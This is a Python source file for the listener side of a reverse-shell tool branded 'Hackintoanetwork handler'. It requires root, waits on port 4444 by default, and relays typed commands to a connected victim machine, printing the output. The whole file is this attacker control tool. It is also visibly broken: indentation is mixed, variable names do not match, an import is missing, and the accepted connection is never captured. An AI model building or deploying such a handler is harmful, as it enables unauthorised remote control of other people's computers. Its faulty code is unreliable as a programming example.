 #Server
import socket
import os
try:
	def create_socket():
    global s
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
    except socket.error() as strError:
        print(f"Error creating socket {strError}")


	def socket_bind():
	    global s
	    try:
	        print(f"Listening on port {intPort}")
	        s.bind((strHost, intPort))
	        s.listen(20)
	    except socket.error() as strError:
	        print(f"Error binding socket {strError} Retrying...")
	        socket_bind()


	def socket_accept():
	    while True:
	        try:
	            conn, addr = s.accept()
	            return conn,addr
	        except socket.error:
	            print("Error accepting connections!")
	            continue


	def command(conn, addr):
		print("\033[1;36m[+] Connected to\033[1;m", addr)
		print('')
		while True:
			try:
				command = input(">")
				if command == "exit":
					conn.send(b"exit")
					conn.close()
					break
				elif command == "cls":
					os.system('clear')
				elif command == "clear":
					os.system('clear')
				elif command == "":
					print("[ Input the command ]")
				else:
					conn.send(command.encode())
					output = conn.recv(65535)
					print(output.decode("euc-kr", "ignore"), end="")
			except socket.error as e: 
        		print(f"Error, connection was lost! :\n{e}")
        		return
	
	if __name__ == "__main__":
		if not os.geteuid() == 0:
	    		sys.exit("""\033[1;91m\n[!] Hackintoanetwork must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")
		os.system('clear')
		print("""\033[1;36m
  ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
  ├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
  ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m
  ┬ ┬┌─┐┌┐┌┌┬┐┬  ┌─┐┬─┐
  ├─┤├─┤│││ │││  ├┤ ├┬┘
  ┴ ┴┴ ┴┘└┘─┴┘┴─┘└─┘┴└─""")
		print('')
		print("""  [ Coded by @hackintoanetwork \033[1;36m|\033[1;m Website : hackintoanetwork.com ]""")
		print('')
		Host = "0.0.0.0"
		Port = input('  PORT : \033[1;36m')
		if Port == '' :
			print ("  Default -> 4444") 
			Port = 4444
		Port = int(Port)
		print('')
		print("\033[1;36m  [+] Waiting for Connection...")
		create_socket()
		socket_bind()
		socket_accept()
		os.system('clear')
		command(conn, addr)

except KeyboardInterrupt:
	os.system('clear')